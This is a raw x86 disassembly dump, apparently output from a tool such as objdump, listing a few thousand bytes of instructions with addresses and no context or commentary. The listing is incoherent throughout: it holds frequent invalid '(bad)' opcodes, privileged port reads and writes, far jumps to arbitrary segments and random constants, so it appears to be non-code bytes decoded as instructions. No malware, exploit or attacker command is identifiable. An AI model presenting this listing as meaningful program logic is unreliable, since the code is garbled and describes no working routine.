  42051d:	out    0xc9,al
  42051f:	in     al,0x28
  420521:	jecxz  0x4204ec
  420523:	cmp    edi,ebx
  420525:	or     al,0x9e
  420527:	pop    edx
  420528:	mov    fs,WORD PTR [edx+0x38]
  42052b:	js     0x420502
  42052d:	test   DWORD PTR [esi],eax
  42052f:	(bad)  
  420530:	in     eax,0xe9
  420532:	ds imul esp,eax,0x35
  420536:	fsub   QWORD PTR [ebp+0x36576ee2]
  42053c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42053d:	lock inc edx
  42053f:	gs mov ch,0xfb
  420542:	mov    ebx,DWORD PTR [ecx]
  420544:	or     BYTE PTR [edx-0x31baf9f3],0x19
  42054b:	call   0x3a47a1d5
  420550:	sub    esi,DWORD PTR [eax+ecx*1]
  420553:	pop    ss
  420554:	and    bl,al
  420556:	jecxz  0x420534
  420558:	sbb    al,0x9b
  42055a:	jp     0x4205ab
  42055c:	and    eax,0xca706328
  420561:	cwde   
  420562:	mov    al,ah
  420564:	test   dl,ah
  420566:	sub    al,0xe3
  420568:	rcl    BYTE PTR [edi-0x4b],0x67
  42056c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42056d:	in     al,dx
  42056e:	test   eax,0x1b9782ae
  420573:	jo     0x4204f9
  420575:	pop    eax
  420576:	cmp    eax,DWORD PTR [eax+0x6f]
  420579:	push   ebp
  42057a:	push   edx
  42057b:	jne    0x420506
  42057d:	xor    bl,BYTE PTR [ebx]
  42057f:	fstp   TBYTE PTR [esi]
  420581:	jo     0x4205d7
  420583:	cmp    DWORD PTR ds:0xf4f45ddf,ebx
  420589:	or     eax,0x855ea917
  42058e:	mov    ds:0x64158e90,al
  420593:	sub    BYTE PTR [eax-0x78b0624b],0xbf
  42059a:	cmc    
  42059b:	arpl   bx,di
  42059d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42059e:	adc    DWORD PTR [esi+esi*8+0x3e],esi
  4205a2:	sar    DWORD PTR [ebp+edx*4-0x44],cl
  4205a6:	xchg   ecx,eax
  4205a7:	and    BYTE PTR [edi],ah
  4205a9:	es push eax
  4205ab:	and    DWORD PTR [ebx+0x45c5bb36],edi
  4205b1:	pop    es
  4205b2:	and    edi,DWORD PTR [edi-0xb]
  4205b5:	cmc    
  4205b6:	and    al,0xa
  4205b8:	xor    dl,bl
  4205ba:	mov    ds:0x7f3c7292,al
  4205bf:	adc    DWORD PTR [ecx-0x7bd3d8f6],ebp
  4205c5:	div    BYTE PTR [edx-0x1faa6e39]
  4205cb:	pop    ebp
  4205cc:	push   edx
  4205cd:	into   
  4205ce:	dec    edx
  4205cf:	mov    fs,WORD PTR [esi-0x6b984fb7]
  4205d5:	cmp    bh,BYTE PTR [ebx+0x2486d7d7]
  4205db:	or     DWORD PTR [ebp+0x5481024],esp
  4205e1:	clc    
  4205e2:	in     eax,dx
  4205e3:	pop    esp
  4205e4:	sub    DWORD PTR [ebx],0xffffff90
  4205e7:	sti    
  4205e8:	ret    
  4205e9:	jns    0x42060d
  4205eb:	neg    edi
  4205ed:	ins    DWORD PTR es:[edi],dx
  4205ee:	mov    esi,0x8558b2ed
  4205f3:	sub    BYTE PTR ds:0x4166e856,0x9f
  4205fa:	push   edx
  4205fb:	xor    al,0x43
  4205fd:	inc    ebx
  4205fe:	jns    0x4205f9
  420600:	mov    ecx,0x760885d6
  420605:	mov    dl,0x34
  420607:	int    0x11
  420609:	pop    ds
  42060a:	cmp    ebp,esp
  42060c:	pop    ebx
  42060d:	in     eax,0xb3
  42060f:	lods   eax,DWORD PTR ds:[esi]
  420610:	outs   dx,DWORD PTR ds:[esi]
  420611:	ret    0xfad2
  420614:	pop    ss
  420615:	pop    esi
  420616:	enter  0xe09d,0xea
  42061a:	repnz adc cl,BYTE PTR [edi+0x548a1b4e]
  420621:	jns    0x4205fa
  420623:	mov    ds:0xca5d98d3,eax
  420628:	into   
  420629:	sbb    esp,DWORD PTR [ebx]
  42062b:	pop    es
  42062c:	adc    edx,DWORD PTR [eax+0x3bb0c366]
  420632:	call   0x9c8c:0x5b1e543a
  420639:	das    
  42063a:	ds jno 0x420646
  42063d:	out    0x7a,eax
  42063f:	popa   
  420640:	xor    ebp,DWORD PTR [ecx-0x40]
  420643:	sub    eax,0x77ded972
  420648:	mov    edi,0xf5951d24
  42064d:	les    edi,FWORD PTR [ebx+0x5a2f03dc]
  420653:	xor    DWORD PTR [ebp-0x61],ecx
  420656:	pop    ecx
  420657:	adc    al,0xa7
  420659:	push   ss
  42065a:	jle    0x4205e2
  42065c:	jnp    0x4206b4
  42065e:	sti    
  42065f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420660:	call   0xb84a:0xbb710f45
  420667:	dec    esi
  420668:	test   al,0x8b
  42066a:	div    DWORD PTR [edi+0x3d]
  42066d:	retf   0xce79
  420670:	daa    
  420671:	mov    cs,WORD PTR [ecx]
  420673:	add    BYTE PTR [ecx],al
  420675:	popa   
  420676:	imul   eax,DWORD PTR [eax-0x5fa3512e],0xffffffcf
  42067d:	xchg   edx,eax
  42067e:	fcmovbe st,st(3)
  420680:	jl     0x4206d2
  420682:	xor    ebx,esi
  420684:	add    eax,0x5ed22bd8
  420689:	sub    edx,DWORD PTR [eax+edx*4]
  42068c:	add    BYTE PTR [esi+0x7],al
  42068f:	ror    BYTE PTR [ebp+0x5b060199],cl
  420695:	cmp    al,0x33
  420697:	inc    esi
  420698:	add    dl,BYTE PTR [ebx]
  42069a:	shr    DWORD PTR [esi+ebp*4-0x59],cl
  42069e:	mov    bh,BYTE PTR [esi-0x11176338]
  4206a4:	fsub   QWORD PTR [edx-0x2c]
  4206a7:	aas    
  4206a8:	and    al,0xd0
  4206aa:	jb     0x42062c
  4206ac:	shr    BYTE PTR [ebp+0x7f5dae4b],cl
  4206b2:	xchg   edi,eax
  4206b3:	stc    
  4206b4:	push   edi
  4206b5:	bound  esp,QWORD PTR [esi-0x3e]
  4206b8:	jo     0x4206eb
  4206ba:	or     bl,cl
  4206bc:	sbb    eax,0x381582a1
  4206c1:	js     0x42070e
  4206c3:	mov    cs:0xcb40c893,al
  4206c9:	push   0xa2b083ba
  4206ce:	or     ah,cl
  4206d0:	xor    eax,0xaa57fcb0
  4206d5:	jecxz  0x420743
  4206d7:	mov    ds:0xb3c5ab18,al
  4206dc:	out    dx,al
  4206dd:	xor    BYTE PTR [ebp+0x5b],bl
  4206e0:	(bad)  
  4206e2:	mov    edx,0x31ce32b0
  4206e7:	inc    edi
  4206e8:	dec    eax
  4206e9:	jge    0x4206cd
  4206eb:	ret    
  4206ec:	call   0xa079:0xaafe4100
  4206f3:	aaa    
  4206f4:	mov    esi,0x4e1a5b79
  4206f9:	ret    
  4206fa:	jle    0x42075a
  4206fc:	stc    
  4206fd:	mov    cl,0xb7
  4206ff:	cld    
  420700:	and    bl,ah
  420702:	jle    0x420726
  420704:	into   
  420705:	repz jg 0x4206e7
  420708:	xchg   esp,eax
  420709:	jne    0x4206fc
  42070b:	stos   DWORD PTR es:[edi],eax
  42070c:	sbb    ebx,DWORD PTR [edi]
  42070e:	dec    ecx
  42070f:	cmp    eax,0x918f2d89
  420714:	in     al,0x39
  420716:	sub    ch,BYTE PTR [edx-0x11]
  420719:	shr    BYTE PTR [ecx],1
  42071b:	test   eax,0xd78c7ccc
  420720:	enter  0x759d,0x70
  420724:	pop    esp
  420725:	pusha  
  420726:	idiv   BYTE PTR [esi+0xb]
  420729:	aas    
  42072a:	rcr    BYTE PTR [esi+edi*4-0x5e3f3934],0x69
  420732:	xor    al,0xa1
  420734:	repnz pop edi
  420736:	push   eax
  420737:	neg    DWORD PTR [ecx-0x30b7148b]
  42073d:	pushf  
  42073e:	jno    0x4206fc
  420740:	addr16 mov ch,0xca
  420743:	xor    DWORD PTR fs:[edi],0xd38ebd53
  42074a:	imul   ebx,DWORD PTR [ebx],0x6e
  42074d:	xchg   DWORD PTR ds:0xa05d0fe5,ecx
  420753:	or     edx,esp
  420755:	rol    al,cl
  420757:	add    eax,0x85ab167
  42075c:	push   0x5a3b640a
  420761:	sub    eax,0x81b2996c
  420766:	jne    0x420741
  420768:	fiadd  WORD PTR [edx-0x6f1ba6a1]
  42076e:	inc    sp
  420770:	in     eax,dx
  420771:	and    dl,ch
  420773:	fcom   QWORD PTR [eax-0x3f0640da]
  420779:	mov    ch,0xa
  42077b:	cmp    BYTE PTR [esi+0x479f0f7a],dh
  420781:	iret   
  420782:	js     0x4207f1
  420784:	dec    ecx
  420785:	(bad)  
  420788:	jbe    0x4207b2
  42078a:	xor    dh,BYTE PTR [ebx]
  42078c:	out    0xdd,eax
  42078e:	jmp    0x4f893ca2
  420793:	or     al,0x4a
  420796:	push   ss
  420797:	gs (bad) 
  420799:	cmp    ah,BYTE PTR [edi+0x75f2f1d3]
  42079f:	mov    esi,0xb9463c7a
  4207a4:	movsx  eax,WORD PTR [eax]
  4207a7:	loopne 0x420817
  4207a9:	pop    edi
  4207aa:	out    0x54,al
  4207ac:	sar    edi,cl
  4207ae:	aam    0x33
  4207b0:	and    eax,0x7b66cee6
  4207b5:	sub    DWORD PTR [ecx],esi
  4207b7:	aad    0x15
  4207b9:	(bad)  
  4207ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207bb:	add    eax,0x7cebba25
  4207c0:	scas   eax,DWORD PTR es:[edi]
  4207c1:	imul   esi,DWORD PTR [ebp+0x48692ab8],0x6d
  4207c8:	sub    al,0x7
  4207ca:	cmp    edx,DWORD PTR [edx]
  4207cc:	xchg   esp,eax
  4207cd:	sbb    BYTE PTR [eax+eax*4],bl
  4207d0:	test   BYTE PTR [edx+0x78],ch
  4207d3:	mov    ebx,0x5f453611
  4207d8:	dec    esp
  4207d9:	cmovno ebx,DWORD PTR [esi-0x134556f2]
  4207e0:	xchg   edx,eax
  4207e1:	int    0xb7
  4207e3:	fistp  QWORD PTR [ecx-0x36]
  4207e6:	xchg   ebp,eax
  4207e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e8:	mov    esi,0x9d0f8ac8
  4207ed:	in     eax,0xf5
  4207ef:	aam    0x2a
  4207f1:	pop    ds
  4207f2:	out    0xca,al
  4207f4:	mov    dl,dh
  4207f6:	or     al,0xbd
  4207f8:	add    DWORD PTR [ebp-0x27c0199c],edx
  4207fe:	hlt    
  4207ff:	mov    ecx,0xac5343fa
  420804:	and    eax,0xc565385
  420809:	fidiv  WORD PTR [ebp+0x5bfde3f7]
  42080f:	xlat   BYTE PTR ds:[ebx]
  420810:	adc    bl,0xc5
  420813:	mov    cs,WORD PTR [edi+0x74]
  420816:	icebp  
  420817:	and    eax,ecx
  420819:	mov    edx,0x733ff0c4
  42081e:	push   esi
  42081f:	mov    ds:0xa20ec40b,al
  420824:	(bad)  
  420825:	cmp    ebp,ebp
  420827:	(bad)  
  420828:	mov    edi,0x294ba9cf
  42082d:	or     bl,cl
  42082f:	mov    ds:0x69fd67e2,al
  420834:	pusha  
  420835:	aaa    
  420836:	push   0xae290328
  42083b:	not    BYTE PTR [edi-0xacb26a5]
  420841:	bound  edi,QWORD PTR [esi+0x45]
  420844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420845:	outs   dx,DWORD PTR cs:[esi]
  420847:	xor    BYTE PTR [esi+0x2],bh
  42084a:	or     ecx,DWORD PTR [edi-0x4b]
  42084d:	(bad)  
  42084e:	pusha  
  42084f:	mov    BYTE PTR [edi-0x7632fd2c],bh
  420855:	pop    esp
  420856:	push   edx
  420857:	pop    esi
  420858:	dec    ebx
  420859:	dec    esp
  42085a:	loope  0x42088c
  42085c:	cmp    al,0xec
  42085e:	jns    0x42084d
  420860:	aaa    
  420861:	imul   BYTE PTR [esp+ecx*4]
  420864:	cli    
  420865:	xor    eax,edx
  420867:	cmc    
  420868:	xchg   BYTE PTR [eax-0x88833de],cl
  42086e:	push   ebp
  42086f:	cmp    eax,0x864fc8cb
  420874:	cmp    ebx,DWORD PTR [ebp-0x762ca46]
  42087a:	xor    al,0xbb
  42087c:	lods   al,BYTE PTR ds:[esi]
  42087d:	mov    WORD PTR [ebx+0x3ff85a2],fs
  420883:	sub    BYTE PTR [ebx],cl
  420885:	ret    
  420886:	jnp    0x420899
  420888:	add    DWORD PTR [eax+0x78],esi
  42088b:	pop    ss
  42088c:	inc    edx
  42088d:	test   DWORD PTR [edi],0x83a460ca
  420893:	test   al,0x4b
  420895:	ins    BYTE PTR es:[edi],dx
  420896:	test   bh,al
  420898:	jo     0x42082d
  42089a:	inc    ebx
  42089b:	jnp    0x420907
  42089d:	pushf  
  42089e:	loop   0x4208ae
  4208a0:	lea    edx,[ebp-0x31f09ffd]
  4208a6:	and    al,0xd7
  4208a8:	stos   DWORD PTR es:[edi],eax
  4208a9:	add    BYTE PTR [ebp+0x45],al
  4208ac:	cli    
  4208ad:	pusha  
  4208ae:	mov    ebp,0xaa369b3d
  4208b3:	jle    0x42092d
  4208b5:	sbb    al,0x9d
  4208b7:	dec    ecx
  4208b8:	inc    ecx
  4208b9:	lods   eax,DWORD PTR ds:[esi]
  4208ba:	pop    ss
  4208bb:	mov    eax,0xa64b1cb
  4208c0:	push   ds
  4208c1:	cmp    DWORD PTR [ebx-0x43],esp
  4208c4:	jns    0x42089a
  4208c6:	leave  
  4208c7:	xchg   ebx,eax
  4208c8:	cmp    eax,0xdf570531
  4208cd:	(bad)  ds:0x83af8747
  4208d3:	imul   bl
  4208d5:	mov    cl,0x17
  4208d7:	enter  0x2d7e,0x6b
  4208db:	dec    ebx
  4208dc:	dec    esi
  4208dd:	pop    es
  4208de:	push   ebx
  4208df:	std    
  4208e0:	dec    eax
  4208e1:	(bad)  
  4208e3:	out    0xc7,al
  4208e5:	adc    eax,DWORD PTR [edi]
  4208e7:	jmp    0x4208a0
  4208e9:	jmp    0x4208eb
  4208eb:	sti    
  4208ec:	fild   WORD PTR [edi]
  4208ee:	mov    edi,0xecc9c93c
  4208f3:	mov    eax,ds:0xb1776db6
  4208f8:	jo     0x42094c
  4208fa:	lds    eax,FWORD PTR [ecx+0x56]
  4208fd:	and    bh,BYTE PTR [ebx+0x7c730e1e]
  420903:	inc    ecx
  420904:	cs jmp 0xa85b:0x4566ec4
  42090c:	imul   BYTE PTR [eax-0x6ff08250]
  420912:	das    
  420913:	add    BYTE PTR [ecx-0x39],0xaf
  420917:	cs test cl,dl
  42091a:	sbb    BYTE PTR [ecx-0x6c],bh
  42091d:	(bad)  
  42091e:	div    BYTE PTR [ecx-0x26d182b7]
  420924:	and    bl,BYTE PTR [ebx-0x405e3903]
  42092a:	cmp    BYTE PTR [esi+ecx*4-0x7e4297a0],0xf7
  420932:	jo     0x42091c
  420934:	adc    ebp,DWORD PTR [esi]
  420936:	ss dec eax
  420938:	xor    ebp,DWORD PTR [ebx+0x79]
  42093b:	sbb    edx,DWORD PTR [ebx-0x735ce14f]
  420941:	sub    eax,0x4cac253d
  420946:	fbstp  TBYTE PTR [esi+0x613ce864]
  42094c:	sar    eax,1
  42094e:	test   eax,0xa23c028d
  420953:	pop    esi
  420954:	fwait
  420955:	addr16 xchg edi,eax
  420957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420958:	inc    eax
  420959:	test   BYTE PTR [eax+0x51bb669e],0x55
  420960:	mov    BYTE PTR [esi-0x47132bb0],bh
  420966:	rcr    DWORD PTR [ecx-0x73],0x43
  42096a:	jp     0x42095c
  42096c:	adc    eax,ebp
  42096e:	mov    ds:0x363007b3,eax
  420973:	mov    esi,0x3430db47
  420978:	cmp    al,0xb6
  42097a:	add    eax,0x93b85748
  42097f:	jbe    0x4209be
  420981:	leave  
  420982:	mov    dl,0xb4
  420984:	loopne 0x4209de
  420986:	fsub   DWORD PTR [edi+0x3e2b937a]
  42098c:	cmp    edi,DWORD PTR [edi]
  42098e:	or     DWORD PTR [edi+0x4c016244],eax
  420994:	jae    0x420942
  420996:	jno    0x4209b9
  420998:	js     0x4209e1
  42099a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42099b:	adc    ah,BYTE PTR [eax-0x1f9bcab6]
  4209a1:	cmp    al,0xfc
  4209a3:	jmp    0x4209bf
  4209a5:	mov    al,0xba
  4209a7:	add    BYTE PTR [edx],bl
  4209a9:	mov    ds:0x8d0bc6b,eax
  4209ae:	mov    ds:0x8080fed2,al
  4209b3:	push   eax
  4209b4:	loop   0x42098d
  4209b6:	mov    eax,0x49c534dc
  4209bb:	push   0x2b
  4209bd:	mov    edx,0x67a03921
  4209c2:	sbb    eax,DWORD PTR gs:[ecx]
  4209c5:	int3   
  4209c6:	jg     0x4209a0
  4209c8:	popa   
  4209c9:	inc    edx
  4209ca:	gs mov ecx,0xdfbdc840
  4209d0:	sbb    ah,BYTE PTR [bx+di+0x1]
  4209d4:	ins    BYTE PTR es:[edi],dx
  4209d5:	adc    cl,BYTE PTR [ebp+ebx*2+0xd]
  4209d9:	clc    
  4209da:	in     al,0xa5
  4209dc:	mov    BYTE PTR [ebx-0x7c39a94e],al
  4209e2:	test   eax,ebx
  4209e4:	fdivr  DWORD PTR [eax]
  4209e6:	pop    ecx
  4209e7:	ja     0x420a2a
  4209e9:	pop    edi
  4209ea:	sub    edx,DWORD PTR ds:0xa8f93ced
  4209f0:	sub    eax,0x36253575
  4209f5:	add    dh,dl
  4209f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209f8:	jle    0x4209ed
  4209fa:	push   eax
  4209fb:	dec    ebx
  4209fc:	mov    es,WORD PTR [esi]
  4209fe:	ret    
  4209ff:	mov    bl,0xa7
  420a01:	push   esp
  420a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a03:	in     eax,0xd1
  420a05:	fmul   st,st(7)
  420a07:	mov    ch,BYTE PTR [eax-0x33eea649]
  420a0d:	push   eax
  420a0e:	aaa    
  420a0f:	stc    
  420a10:	out    dx,eax
  420a11:	add    BYTE PTR [edx+edx*4-0x66],0xb
  420a16:	or     BYTE PTR [eax+0x50],0x15
  420a1a:	adc    DWORD PTR ds:0x7ec8fa58,edi
  420a20:	sar    ebx,cl
  420a22:	add    dl,BYTE PTR [ebx-0x459157f8]
  420a28:	push   ss
  420a29:	pop    edx
  420a2a:	mov    edx,0x9851806e
  420a2f:	cli    
  420a30:	leave  
  420a31:	mov    ebp,DWORD PTR [ecx]
  420a33:	aad    0xc4
  420a35:	jne    0x420a34
  420a37:	les    edx,FWORD PTR [ebx+0x2c]
  420a3a:	mov    ch,0x9a
  420a3c:	fsubr  st(5),st
  420a3e:	add    al,0x7a
  420a40:	dec    ecx
  420a41:	sbb    ch,al
  420a43:	sahf   
  420a44:	sahf   
  420a45:	mov    eax,ds:0x5d610273
  420a4a:	mov    dh,0xbd
  420a4c:	jp     0x420a0a
  420a4e:	dec    esi
  420a4f:	int    0xc8
  420a51:	retf   0xb38f
  420a54:	fimul  DWORD PTR [edi+0x34]
  420a57:	xor    esi,DWORD PTR [edx-0x45]
  420a5a:	sub    al,BYTE PTR [edi+0x33]
  420a5d:	leave  
  420a5e:	xor    BYTE PTR [esp+ebx*8-0x72],0xd7
  420a63:	cmp    al,0xc0
  420a65:	adc    dl,BYTE PTR [eax+0x42e739c]
  420a6b:	(bad)  
  420a6c:	mov    dh,0x40
  420a6e:	mov    ebx,0x8b016ec6
  420a73:	mov    eax,0x7ae7e13c
  420a78:	vmread ecx,esi
  420a7b:	loop   0x420ac8
  420a7d:	retf   
  420a7e:	inc    ebp
  420a7f:	aas    
  420a80:	xchg   ebx,eax
  420a81:	add    cl,BYTE PTR [edi+0x6d]
  420a84:	add    ecx,ecx
  420a86:	xchg   ecx,eax
  420a87:	out    0xa8,al
  420a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a8a:	sub    BYTE PTR [ebx],dh
  420a8c:	add    BYTE PTR [ecx],bl
  420a8e:	and    edi,DWORD PTR [edx+ebx*4]
  420a91:	out    0x79,eax
  420a93:	in     eax,dx
  420a94:	fs leave 
  420a96:	mov    ecx,0x46029227
  420a9b:	or     al,0xd9
  420a9d:	add    eax,0x3f9426e0
  420aa2:	cld    
  420aa3:	jns    0x420b00
  420aa5:	aas    
  420aa6:	inc    eax
  420aa7:	sub    ebx,edx
  420aa9:	xor    eax,0x29cd2bea
  420aae:	push   edx
  420aaf:	retf   0xf1a2
  420ab2:	sub    eax,0x98f06e23
  420ab7:	mov    edi,0x3834795b
  420abc:	xchg   DWORD PTR [edx+0x3b],esi
  420abf:	in     eax,dx
  420ac0:	jbe    0x420a7e
  420ac2:	sub    al,0x53
  420ac4:	mov    ah,0xd4
  420ac6:	xor    edx,DWORD PTR [eax+0x1d]
  420ac9:	push   ebp
  420aca:	cmovb  ebp,DWORD PTR [edx-0x226fa1a6]
  420ad1:	dec    ebx
  420ad2:	dec    esi
  420ad3:	and    DWORD PTR [ecx+edx*2],edx
  420ad6:	pop    edi
  420ad7:	xchg   edi,eax
  420ad8:	shl    ah,0x8c
  420adb:	push   edx
  420adc:	aaa    
  420add:	stos   BYTE PTR es:[edi],al
  420ade:	cmp    al,0xfc
  420ae0:	cmp    bh,BYTE PTR [ebp+0x639056cc]
  420ae6:	mov    al,ds:0xa2c0e4ba
  420aeb:	xor    BYTE PTR [ebx+0x6c],cl
  420aee:	dec    edi
  420aef:	jb     0x420b46
  420af1:	clc    
  420af2:	movzx  eax,BYTE PTR [ebx-0x14]
  420af6:	icebp  
  420af7:	xor    ch,BYTE PTR [ebx-0x3e]
  420afa:	jns    0x420ae9
  420afc:	cmp    al,0x92
  420afe:	cmp    DWORD PTR [edx-0x34e920df],0xfffffff7
  420b05:	out    0xf0,al
  420b07:	xor    bh,BYTE PTR [esi+esi*1+0x23]
  420b0b:	imul   esp,DWORD PTR [ecx+0x3f46eaff],0x5d0f708c
  420b15:	and    BYTE PTR [esi+0x63],0xdd
  420b19:	adc    eax,0xa2d48777
  420b1e:	imul   edi,edx,0xfffffffa
  420b21:	sar    DWORD PTR [eax+0x2b3b293d],1
  420b27:	iret   
  420b28:	sbb    ch,0x11
  420b2b:	mov    bh,0x2
  420b2d:	sub    DWORD PTR [eax+ebp*1+0x3e60db8b],ebx
  420b34:	and    BYTE PTR [esi+ebp*2-0x4ba1ec5d],dh
  420b3b:	ins    DWORD PTR es:[edi],dx
  420b3c:	mov    ds:0xefa99a16,al
  420b41:	inc    ebp
  420b42:	hlt    
  420b43:	push   edx
  420b44:	and    bh,BYTE PTR [ecx+eiz*2]
  420b47:	mov    edi,0xdbad3d8d
  420b4c:	inc    ebx
  420b4d:	ja     0x420b47
  420b4f:	addr16 leave 
  420b51:	adc    DWORD PTR [eax+edx*2+0x1ae2ca6],esp
  420b58:	xor    al,0xfb
  420b5a:	loopne 0x420b51
  420b5c:	imul   ecx,DWORD PTR [ebp+0x45def973],0x7bff6f3c
  420b66:	jmp    0x420ba0
  420b68:	mov    ebp,0xd72f3329
  420b6d:	xor    al,0x2d
  420b6f:	fdiv   DWORD PTR ds:0x5fa8191a
  420b75:	mov    eax,ds:0x2d49915d
  420b7a:	iret   
  420b7b:	inc    ebp
  420b7c:	mov    dl,0xa3
  420b7e:	outs   dx,DWORD PTR ds:[esi]
  420b7f:	xchg   DWORD PTR [eax],esp
  420b81:	arpl   WORD PTR [ecx+0x59],ax
  420b84:	stc    
  420b85:	cmp    bl,ch
  420b87:	sub    BYTE PTR [ecx+eiz*4-0x59],ah
  420b8b:	cmp    ah,BYTE PTR [esi-0x47994704]
  420b91:	scas   al,BYTE PTR es:[edi]
  420b92:	xor    eax,0xc9e875a2
  420b97:	lods   eax,DWORD PTR ds:[esi]
  420b98:	scas   eax,DWORD PTR es:[edi]
  420b99:	or     edx,DWORD PTR [ecx-0x5066fd2a]
  420b9f:	test   al,0xf5
  420ba1:	mov    ecx,0xdbd6ba54
  420ba6:	popa   
  420ba7:	sbb    DWORD PTR [ebx-0x45770a36],0x1e
  420bae:	retf   
  420baf:	mov    al,ds:0x2d11f3bd
  420bb4:	je     0x420b65
  420bb6:	dec    ecx
  420bb7:	lahf   
  420bb8:	scas   al,BYTE PTR es:[edi]
  420bb9:	or     bh,0x76
  420bbc:	add    al,0x68
  420bbe:	mov    ebx,0x4795dbe7
  420bc3:	xor    BYTE PTR [esi+0x30f288b1],0x13
  420bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bcb:	call   0x4ec8:0xb8e2e263
  420bd2:	push   eax
  420bd3:	(bad)  
  420bd4:	mov    esp,0xb6ddde28
  420bd9:	enter  0x8f8f,0x84
  420bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bde:	cmc    
  420bdf:	(bad)  
  420be1:	(bad)  
  420be2:	stc    
  420be3:	call   0x985a31f
  420be8:	test   BYTE PTR [edx],ch
  420bea:	push   ss
  420beb:	pop    ds
  420bec:	add    ah,dl
  420bee:	mov    al,0x53
  420bf0:	inc    edi
  420bf1:	xor    al,0xae
  420bf3:	test   eax,0xd08ff1bd
  420bf8:	dec    esi
  420bf9:	test   eax,0x470ce4c4
  420bfe:	aam    0x36
  420c00:	clc    
  420c01:	xchg   esp,eax
  420c02:	fcmovne st,st(7)
  420c04:	mov    bl,0x1f
  420c06:	push   edi
  420c07:	mov    edi,0xdf02cdc0
  420c0c:	ss push ecx
  420c0e:	mov    esp,0xb3cff453
  420c13:	ret    0x73fc
  420c16:	nop
  420c17:	xchg   esi,eax
  420c18:	pop    es
  420c19:	jno    0x420c55
  420c1b:	push   es
  420c1c:	inc    edx
  420c1d:	jmp    0x71a9e519
  420c22:	stos   BYTE PTR es:[edi],al
  420c23:	xchg   esi,eax
  420c24:	inc    edi
  420c25:	enter  0x7129,0xd7
  420c29:	dec    ecx
  420c2a:	dec    edi
  420c2b:	xchg   ebx,eax
  420c2c:	sbb    eax,0x9bf959e5
  420c31:	dec    esp
  420c32:	je     0x420be1
  420c34:	imul   ecx,esi,0xe6e02d77
  420c3a:	sbb    BYTE PTR [ebx],ah
  420c3c:	and    bh,dl
  420c3e:	scas   al,BYTE PTR es:[edi]
  420c3f:	inc    eax
  420c40:	inc    ecx
  420c41:	jbe    0x420c94
  420c43:	dec    ebx
  420c44:	add    eax,0xc369dbc5
  420c49:	pop    ss
  420c4a:	inc    edi
  420c4b:	jo     0x420bcf
  420c4d:	retf   0x9658
  420c50:	test   al,0xea
  420c52:	xor    al,0xe8
  420c54:	mov    esi,0x27167bcc
  420c59:	mov    eax,0x50134f3
  420c5e:	cwde   
  420c5f:	ins    DWORD PTR es:[edi],dx
  420c60:	les    esi,FWORD PTR [ebp+0x7f]
  420c63:	and    ecx,ebp
  420c65:	jmp    0x420caa
  420c67:	adc    eax,0xa63884a6
  420c6c:	shl    BYTE PTR [edi+0x7e],1
  420c6f:	cld    
  420c70:	mov    esi,0x9150e070
  420c75:	inc    edi
  420c76:	aad    0xc0
  420c78:	retf   
  420c79:	bound  ebp,QWORD PTR es:[eax-0x46c8fa32]
  420c80:	into   
  420c81:	mov    dl,0xc0
  420c83:	pop    ds
  420c84:	inc    edx
  420c85:	and    eax,DWORD PTR [eax]
  420c87:	xchg   ebp,eax
  420c88:	ret    
  420c89:	aas    
  420c8a:	xchg   esp,eax
  420c8b:	es jnp 0x420c58
  420c8e:	adc    ah,BYTE PTR [edi]
  420c90:	and    BYTE PTR [ebp-0x310f2e75],bh
  420c96:	outs   dx,DWORD PTR ds:[esi]
  420c97:	or     al,0x53
  420c99:	mov    esp,0xcf416b0
  420c9e:	int    0x9f
  420ca0:	jmp    0xae1e:0x9eb6a69c
  420ca7:	dec    ebx
  420ca8:	test   BYTE PTR [ecx-0x76f09c79],dh
  420cae:	(bad)  
  420caf:	jecxz  0x420d2e
  420cb1:	pusha  
  420cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cb3:	inc    esp
  420cb4:	fisub  DWORD PTR [ebx-0x3e]
  420cb7:	adc    DWORD PTR [edi+0x650d84cb],0xffffff86
  420cbe:	clc    
  420cbf:	jmp    0x68d:0xa15b8468
  420cc6:	fnstcw WORD PTR [ebx]
  420cc8:	mov    bh,0xa4
  420cca:	xchg   esi,eax
  420ccb:	jge    0x420c5a
  420ccd:	jns    0x420d22
  420ccf:	inc    BYTE PTR [ebx]
  420cd1:	fwait
  420cd2:	fs loope 0x420cb0
  420cd5:	and    BYTE PTR [ecx-0xe],dh
  420cd8:	inc    eax
  420cd9:	adc    ebp,DWORD PTR [ebx]
  420cdb:	adc    ch,BYTE PTR [ecx+0x76]
  420cde:	and    eax,0x5cad2b9e
  420ce3:	xchg   esp,eax
  420ce4:	or     BYTE PTR [eax-0x670fc46f],dh
  420cea:	mov    WORD PTR [edx+0x2a11ea4f],gs
  420cf0:	jge    0x420c82
  420cf2:	outs   dx,DWORD PTR ds:[esi]
  420cf3:	outs   dx,DWORD PTR ds:[esi]
  420cf4:	xchg   BYTE PTR [ebx+0x51],dl
  420cf7:	jmp    0x420c9e
  420cf9:	in     eax,dx
  420cfa:	jle    0x420cd8
  420cfc:	xor    bl,BYTE PTR [ebp-0xb]
  420cff:	or     ah,ah
  420d01:	adc    al,0x3d
  420d03:	mov    eax,0x1d36a9e4
  420d08:	adc    DWORD PTR [ebx+0x59],ebx
  420d0b:	fimul  WORD PTR [ebx+0x23]
  420d0e:	aaa    
  420d0f:	xchg   esp,eax
  420d10:	push   esp
  420d11:	jmp    0x71ff:0x9b543f39
  420d18:	jle    0x420d5b
  420d1a:	jl     0x420d33
  420d1c:	inc    eax
  420d1d:	mov    ecx,0xe4a582b
  420d22:	and    dl,al
  420d24:	inc    edi
  420d25:	dec    eax
  420d26:	jno    0x420d79
  420d28:	cmc    
